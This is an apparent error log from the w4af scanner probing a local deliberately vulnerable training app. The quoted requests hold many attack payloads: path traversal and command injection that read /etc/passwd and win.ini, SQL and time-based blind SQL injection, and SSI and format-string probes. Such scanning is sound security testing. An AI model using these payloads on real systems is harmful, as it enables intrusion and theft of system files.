    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9963.trace&#34;&#34;. The request/response that generated the error is: 9963 http://localhost/VulnerableApp/PathTraversal/LEVEL_10?fileName=b%27UserInfo.json%5Cn%27%26%26type%20%25SYSTEMROOT%25%5Cwin.ini 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9964.trace&#34;&#34;. The request/response that generated the error is: 9964 http://localhost/VulnerableApp/PathTraversal/LEVEL_10?fileName=49%27%20OR%20%2749%27%3D%2749%27%20OR%20%2749%27%3D%2749 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9960.trace&#34;&#34;. The request/response that generated the error is: 9960 http://localhost/VulnerableApp/PathTraversal/LEVEL_10?fileName=%60%2Fbin%2Fcat%20%2Fetc%2Fpasswd%60 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9965.trace&#34;&#34;. The request/response that generated the error is: 9965 http://localhost/VulnerableApp/PathTraversal/LEVEL_10?fileName=b%27UserInfo.json%5Cn%27%7Ctype%20%25SYSTEMROOT%25%5Cwin.ini 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9975.trace&#34;&#34;. The request/response that generated the error is: 9975 http://localhost/VulnerableApp/PathTraversal/LEVEL_9?fileName=a%40a.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaX%21 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9972.trace&#34;&#34;. The request/response that generated the error is: 9972 http://localhost/VulnerableApp/PathTraversal/LEVEL_10?fileName=b%27UserInfo.json%5Cn%27%0D%0Atype%20%25SYSTEMROOT%25%5Cwin.ini 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9971.trace&#34;&#34;. The request/response that generated the error is: 9971 http://localhost/VulnerableApp/PathTraversal/LEVEL_10?fileName=49%27%20OR%20%2749%27%3D%2749%27%20OR%20%2749%27%3D%2749 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9976.trace&#34;&#34;. The request/response that generated the error is: 9976 http://localhost/VulnerableApp/PathTraversal/LEVEL_10?fileName=b%27UserInfo.json%5Cn%27run%20type%20%25SYSTEMROOT%25%5Cwin.ini 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9979.trace&#34;&#34;. The request/response that generated the error is: 9979 http://localhost/VulnerableApp/PathTraversal/LEVEL_10?fileName=49%27%20OR%20%2749%27%3D%2749%27%20OR%20%2749%27%3D%2749 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9978.trace&#34;&#34;. The request/response that generated the error is: 9978 http://localhost/VulnerableApp/PathTraversal/LEVEL_10?fileName=b%27UserInfo.json%5Cn%27%0A%2Fbin%2Fcat%20%2Fetc%2Fpasswd 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9974.trace&#34;&#34;. The request/response that generated the error is: 9974 http://localhost/VulnerableApp/PathTraversal/LEVEL_10?fileName=b%27UserInfo.json%5Cn%27%0Atype%20%25SYSTEMROOT%25%5Cwin.ini 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9980.trace&#34;&#34;. The request/response that generated the error is: 9980 http://localhost/VulnerableApp/PathTraversal/LEVEL_9?fileName=111111111111111111111111111111111111111111111111119%21 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9973.trace&#34;&#34;. The request/response that generated the error is: 9973 http://localhost/VulnerableApp/PathTraversal/LEVEL_10?fileName=b%27UserInfo.json%5Cn%27%2Fbin%2Fcat%20%2Fetc%2Fpasswd 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9977.trace&#34;&#34;. The request/response that generated the error is: 9977 http://localhost/VulnerableApp/PathTraversal/LEVEL_10?fileName=b%27UserInfo.json%5Cn%27%3Btype%20%25SYSTEMROOT%25%5Cwin.ini 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/10001.trace&#34;&#34;. The request/response that generated the error is: 10001 http://localhost/VulnerableApp/PathTraversal/LEVEL_12?fileName=htTps%3A%2F%2Fw4af.net%2F 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9994.trace&#34;&#34;. The request/response that generated the error is: 9994 http://localhost/VulnerableApp/PathTraversal/LEVEL_12?fileName=%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9993.trace&#34;&#34;. The request/response that generated the error is: 9993 http://localhost/VulnerableApp/PathTraversal/LEVEL_12?fileName=mvdnf%20%3Dmvdnf 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9995.trace&#34;&#34;. The request/response that generated the error is: 9995 http://localhost/VulnerableApp/PathTraversal/LEVEL_12?fileName=zczso%22zczso 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9992.trace&#34;&#34;. The request/response that generated the error is: 9992 http://localhost/VulnerableApp/PathTraversal/LEVEL_12?fileName=gyqgu%0Agyqgu 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/10003.trace&#34;&#34;. The request/response that generated the error is: 10003 http://localhost/VulnerableApp/PathTraversal/LEVEL_12?fileName=yiv8s%3Cyiv8s 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/10010.trace&#34;&#34;. The request/response that generated the error is: 10010 http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability%0A 404&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/10012.trace&#34;&#34;. The request/response that generated the error is: 10012 http://localhost/VulnerableApp/PathTraversal/LEVEL_12?fileName=%7Bmath%20equation%3D%22x%20%2A%20y%22%20x%3D91144%20y%3D43422%7D 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/10018.trace&#34;&#34;. The request/response that generated the error is: 10018 http://localhost/VulnerableApp/PathTraversal/LEVEL_12?fileName=w4af%0D%0Avulnerable073b%3A%20ae5cw4af 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/10037.trace&#34;&#34;. The request/response that generated the error is: 10037 http://localhost/VulnerableApp/PathTraversal/LEVEL_12?fileName=%2F%2Fw4af.net 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/10032.trace&#34;&#34;. The request/response that generated the error is: 10032 http://localhost/VulnerableApp/PathTraversal/LEVEL_10?fileName=111111111111111111119%21 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/10033.trace&#34;&#34;. The request/response that generated the error is: 10033 http://localhost/VulnerableApp/PathTraversal/LEVEL_12?fileName=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/10034.trace&#34;&#34;. The request/response that generated the error is: 10034 http://localhost/VulnerableApp/PathTraversal/LEVEL_12?fileName=C%3A%5Cboot.ini 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/10036.trace&#34;&#34;. The request/response that generated the error is: 10036 http://localhost/VulnerableApp/PathTraversal/LEVEL_12?fileName=file%3A%2F%2F%2Fetc%2Fpasswd 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/10035.trace&#34;&#34;. The request/response that generated the error is: 10035 http://localhost/VulnerableApp/PathTraversal/LEVEL_12?fileName=%2F..%2F%2F..%2F%2F..%2F%2F..%2F%2F..%2F%2F..%2F%2F..%2F%2F..%2F%2F..%2F%2F..%2F%2F..%2F%2F..%2F%2F..%2F%2F..%2F%2F..%2Fetc%2Fpasswd 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/10039.trace&#34;&#34;. The request/response that generated the error is: 10039 http://localhost/VulnerableApp/PathTraversal/LEVEL_10?fileName=a%40a.aaaaaaaaaaaaaaaaaaaaX%21 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/10038.trace&#34;&#34;. The request/response that generated the error is: 10038 http://localhost/VulnerableApp/PathTraversal/LEVEL_12?fileName=%2Fetc%2Fpasswd%00 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/10059.trace&#34;&#34;. The request/response that generated the error is: 10059 http://localhost/VulnerableApp/PathTraversal/LEVEL_12?fileName=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/10060.trace&#34;&#34;. The request/response that generated the error is: 10060 http://localhost/VulnerableApp/PathTraversal/LEVEL_12?fileName=res.end%28%28new%20Array%285%2B1%29%29.join%28%27mgmqh%27%29%29 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/10069.trace&#34;&#34;. The request/response that generated the error is: 10069 http://localhost/VulnerableApp/PathTraversal/LEVEL_12?fileName=https%3A%2F%2Fgithub.com%2Fw4af%2Fw4af 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/10070.trace&#34;&#34;. The request/response that generated the error is: 10070 http://localhost/VulnerableApp/PathTraversal/LEVEL_10?fileName=aaaaaaaaaaaaaaaaaaaaX%21 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/10071.trace&#34;&#34;. The request/response that generated the error is: 10071 http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_1%0A 404&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/10072.trace&#34;&#34;. The request/response that generated the error is: 10072 http://localhost/VulnerableApp/PathTraversal/LEVEL_12?fileName=github.com%2Fw4af%2Fw4af 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/10075.trace&#34;&#34;. The request/response that generated the error is: 10075 http://localhost/VulnerableApp/PathTraversal/LEVEL_12?fileName=1%272%223 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/10077.trace&#34;&#34;. The request/response that generated the error is: 10077 http://localhost/VulnerableApp/PathTraversal/LEVEL_12?fileName=b%27UserInfo.json%5Cn%27%26%26type%20%25SYSTEMROOT%25%5Cwin.ini 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/10078.trace&#34;&#34;. The request/response that generated the error is: 10078 http://localhost/VulnerableApp/PathTraversal/LEVEL_12?fileName=%26%26type%20%25SYSTEMROOT%25%5Cwin.ini 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/10079.trace&#34;&#34;. The request/response that generated the error is: 10079 http://localhost/VulnerableApp/PathTraversal/LEVEL_12?fileName=b%27UserInfo.json%5Cn%27%7C%2Fbin%2Fcat%20%2Fetc%2Fpasswd 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/10081.trace&#34;&#34;. The request/response that generated the error is: 10081 http://localhost/VulnerableApp/PathTraversal/LEVEL_12?fileName=b%27UserInfo.json%5Cn%27%3B%2Fbin%2Fcat%20%2Fetc%2Fpasswd 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/10082.trace&#34;&#34;. The request/response that generated the error is: 10082 http://localhost/VulnerableApp/PathTraversal/LEVEL_12?fileName=%60%2Fbin%2Fcat%20%2Fetc%2Fpasswd%60 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/10084.trace&#34;&#34;. The request/response that generated the error is: 10084 http://localhost/VulnerableApp/PathTraversal/LEVEL_12?fileName=b%27UserInfo.json%5Cn%27%3Btype%20%25SYSTEMROOT%25%5Cwin.ini 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/10085.trace&#34;&#34;. The request/response that generated the error is: 10085 http://localhost/VulnerableApp/PathTraversal/LEVEL_12?fileName=b%27UserInfo.json%5Cn%27%2Fbin%2Fcat%20%2Fetc%2Fpasswd 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/10087.trace&#34;&#34;. The request/response that generated the error is: 10087 http://localhost/VulnerableApp/PathTraversal/LEVEL_12?fileName=UserInfo.json%0A 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/10088.trace&#34;&#34;. The request/response that generated the error is: 10088 http://localhost/VulnerableApp/PathTraversal/LEVEL_12?fileName=b%27UserInfo.json%5Cn%27%0A%2Fbin%2Fcat%20%2Fetc%2Fpasswd 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/10089.trace&#34;&#34;. The request/response that generated the error is: 10089 http://localhost/VulnerableApp/PathTraversal/LEVEL_12?fileName=%7C%2Fbin%2Fcat%20%2Fetc%2Fpasswd 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/10091.trace&#34;&#34;. The request/response that generated the error is: 10091 http://localhost/VulnerableApp/PathTraversal/LEVEL_12?fileName=%7Ctype%20%25SYSTEMROOT%25%5Cwin.ini 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/10092.trace&#34;&#34;. The request/response that generated the error is: 10092 http://localhost/VulnerableApp/PathTraversal/LEVEL_12?fileName=%3B%2Fbin%2Fcat%20%2Fetc%2Fpasswd 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/10093.trace&#34;&#34;. The request/response that generated the error is: 10093 http://localhost/VulnerableApp/PathTraversal/LEVEL_12?fileName=%26%26%2Fbin%2Fcat%20%2Fetc%2Fpasswd 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/10094.trace&#34;&#34;. The request/response that generated the error is: 10094 http://localhost/VulnerableApp/PathTraversal/LEVEL_12?fileName=UserInfo.json%0A 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/10090.trace&#34;&#34;. The request/response that generated the error is: 10090 http://localhost/VulnerableApp/PathTraversal/LEVEL_12?fileName=%2Fbin%2Fcat%20%2Fetc%2Fpasswd 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/10101.trace&#34;&#34;. The request/response that generated the error is: 10101 http://localhost/VulnerableApp/PathTraversal/LEVEL_12?fileName=b%27UserInfo.json%5Cn%27%0D%0Atype%20%25SYSTEMROOT%25%5Cwin.ini 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/10107.trace&#34;&#34;. The request/response that generated the error is: 10107 http://localhost/VulnerableApp/PathTraversal/LEVEL_12?fileName=56%20OR%2056%3D56%20OR%2056%3D56%20 200&#39;</error>
    <error caller="threading">b&#39;The generic plugin got an error while requesting &#34;http://localhost/VulnerableApp/PathTraversal/LEVEL_12?fileName=&#34;. Exception: &#34;[Errno 24] Too many open files&#34;. Generated 204 &#34;No Content&#34; response (id:10108)&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/10109.trace&#34;&#34;. The request/response that generated the error is: 10109 http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_2%0A 404&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/10116.trace&#34;&#34;. The request/response that generated the error is: 10116 http://localhost/VulnerableApp/PathTraversal/LEVEL_12?fileName=56%20OR%2056%3D56%20OR%2056%3D56%20 200&#39;</error>
    <error caller="threading">b&#39;The mx_injection plugin got an error while requesting &#34;http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_1?comment=%22&#34;. Exception: &#34;[Errno 24] Too many open files&#34;. Generated 204 &#34;No Content&#34; response (id:10117)&#39;</error>
    <error caller="threading">b&#39;The generic plugin got an error while requesting &#34;http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_1?comment=vuvAfmSu&#34;. Exception: &#34;[Errno 24] Too many open files&#34;. Generated 204 &#34;No Content&#34; response (id:10118)&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/10119.trace&#34;&#34;. The request/response that generated the error is: 10119 http://localhost/VulnerableApp/PathTraversal/LEVEL_12?fileName=LYt8z5Yt 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/10120.trace&#34;&#34;. The request/response that generated the error is: 10120 http://localhost/VulnerableApp/PathTraversal/LEVEL_12?fileName=UserInfo.json%0A 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/10121.trace&#34;&#34;. The request/response that generated the error is: 10121 http://localhost/VulnerableApp/PathTraversal/LEVEL_12?fileName=56%20OR%2056%3D56%20OR%2056%3D56%20 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/10129.trace&#34;&#34;. The request/response that generated the error is: 10129 http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_1?comment=%25n%25n%25n%25n%25n%25n%25n%25n%25n%25n 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/10130.trace&#34;&#34;. The request/response that generated the error is: 10130 http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_1?comment=%25n 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/10131.trace&#34;&#34;. The request/response that generated the error is: 10131 http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_1?comment=iDontExist 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/10132.trace&#34;&#34;. The request/response that generated the error is: 10132 http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_1?comment=d%27z%220 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/10134.trace&#34;&#34;. The request/response that generated the error is: 10134 http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_1?comment=36ljt%3C36ljt36ljt--%3E36ljt36ljt%2A%2F36ljt36ljt%2A%2F%3A%28%22%2736ljt36ljt%3A36ljt36ljt%0A36ljt36ljt%2236ljt36ljt%2736ljt36ljt%6036ljt36ljt%20%3D36ljt 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/10135.trace&#34;&#34;. The request/response that generated the error is: 10135 http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_1 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/10136.trace&#34;&#34;. The request/response that generated the error is: 10136 http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_1?comment=%3C%21--%23set%20var%3D%22SEED_A%22%20value%3D%2234151%22%20--%3E%3C%21--%23echo%20var%3D%22SEED_A%22%20--%3E%3C%21--%23set%20var%3D%22SEED_B%22%20value%3D%2291541%22%20--%3E%3C%21--%23echo%20var%3D%22SEED_B%22%20--%3E 200&#39;</error>
    <error caller="threading">b&#39;The phishing_vector plugin got an error while requesting &#34;http://localhost/VulnerableApp/SSRFVulnerability/LEVEL_3?fileurl=fTp%3A%2F%2Fw4af.net%2F&#34;. Exception: &#34;HTTP timeout error&#34;. Generated 204 &#34;No Content&#34; response (id:12768)&#39;</error>
    <error caller="threading">b&#39;The blind_sqli plugin got an error while requesting &#34;http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_7?comment=%22%2B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%288%29%29%29foo%29%2B%22&#34;. Exception: &#34;HTTP timeout error&#34;. Generated 204 &#34;No Content&#34; response (id:13093)&#39;</error>
    <error caller="threading">b&#39;The blind_sqli plugin got an error while requesting &#34;http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_7?comment=%27%20AND%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%288%29%29%29foo%29%20AND%20%271%27%3D%271&#34;. Exception: &#34;HTTP timeout error&#34;. Generated 204 &#34;No Content&#34; response (id:13121)&#39;</error>
    <error caller="threading">b&#39;The blind_sqli plugin got an error while requesting &#34;http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_7?comment=%27%20OR%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%288%29%29%29foo%29%20OR%20%271%27%3D%272&#34;. Exception: &#34;HTTP timeout error&#34;. Generated 204 &#34;No Content&#34; response (id:13142)&#39;</error>
    <error caller="threading">b&#39;The blind_sqli plugin got an error while requesting &#34;http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_7?comment=1%20or%20pg_sleep%288%29&#34;. Exception: &#34;HTTP timeout error&#34;. Generated 204 &#34;No Content&#34; response (id:13210)&#39;</error>
    <error caller="threading">b&#39;The blind_sqli plugin got an error while requesting &#34;http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_7?comment=1%27%20or%20pg_sleep%288%29%20and%20%271%27%3D%271&#34;. Exception: &#34;HTTP timeout error&#34;. Generated 204 &#34;No Content&#34; response (id:13219)&#39;</error>
    <error caller="threading">b&#39;The os_commanding plugin got an error while requesting &#34;http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_7?comment=%0Aping%20-n%209%20localhost&#34;. Exception: &#34;HTTP timeout error&#34;. Generated 204 &#34;No Content&#34; response (id:13365)&#39;</error>
